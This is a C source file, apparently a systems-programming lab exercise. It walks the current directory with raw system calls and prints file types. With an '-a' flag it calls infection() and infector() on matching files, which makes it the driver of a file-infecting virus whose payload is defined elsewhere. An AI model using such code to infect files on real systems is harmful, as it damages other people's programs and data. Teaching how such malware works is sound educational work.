#include "util.h"

void printDir(struct dirent* d,int out, char* d_type){
  /*print the directory struct*/
  system_call(SYS_WRITE,out,d->name,strlen(d->name));
  system_call(SYS_WRITE,out,",  data type: ",14);
  system_call(SYS_WRITE,out,d_type,strlen(d_type));
  system_call(SYS_WRITE,out,"\n",1);
}

int main (int argc , char* argv[], char* envp[]){
  int fd,read,i,P=0,A=0;
  char d_type;
  char buf[BUF_SIZE];
  char* prefix = "*";
  struct dirent *d;

  for (i=1; i < argc; i++){
    if(strncmp("-p",argv[i],2)==0){
      prefix = argv[i]+2;
      P=1;
    }
    else if(strncmp("-a",argv[i],2)==0){
      prefix = argv[i]+2;
      A=1;
    }    
  }
  system_call(SYS_WRITE,STDOUT,"Flame is striking!\n",19);
  int start = (int)code_start;
  int end = (int)code_end;
  system_call(SYS_WRITE,STDOUT,"Addr code_start:  ",18);
  system_call(SYS_WRITE,STDOUT,itoa(start),strlen(itoa(start)));
  system_call(SYS_WRITE,STDOUT,"\n",1);
  system_call(SYS_WRITE,STDOUT,"Addr code_end:    ",18);
  system_call(SYS_WRITE,STDOUT,itoa(end),strlen(itoa(end)));
  system_call(SYS_WRITE,STDOUT,"\n\n",2);

  fd = system_call(SYS_OPEN,".",O_RONLY,0777);/*open my dir*/
  if (fd < 0)
    system_call(SYS_EXIT, 0x55);
  
  read = system_call(SYS_GETDENTS,fd,buf,BUF_SIZE);
  if (read == -1)
    system_call(SYS_EXIT, 0x55);

  int pos=0;
  while(pos < read) {
    d = (dirent *) (buf + pos);
    d_type = *(buf + pos + d->len - 1);
    char *d_type_string = (d_type == DT_REG) ?  "regular" :
                      (d_type == DT_DIR) ?  "directory" :
                      (d_type == DT_FIFO) ? "FIFO" :
                      (d_type == DT_SOCK) ? "socket" :
                      (d_type == DT_LNK) ?  "symlink" :
                      (d_type == DT_BLK) ?  "block dev" :
                      (d_type == DT_CHR) ?  "char dev" : "???";

    int cmp = strncmp(d->name ,prefix,strlen(prefix));
    if(P==0 && A==0)
        printDir(d,STDOUT,d_type_string);
    else if(cmp==0){
        printDir(d,STDOUT,d_type_string);
        if(A==1){
          infection();
          infector(d->name);
        }
    }
    pos += d->len;  
  }
  system_call(SYS_CLOSE,fd);
  return 0;
}






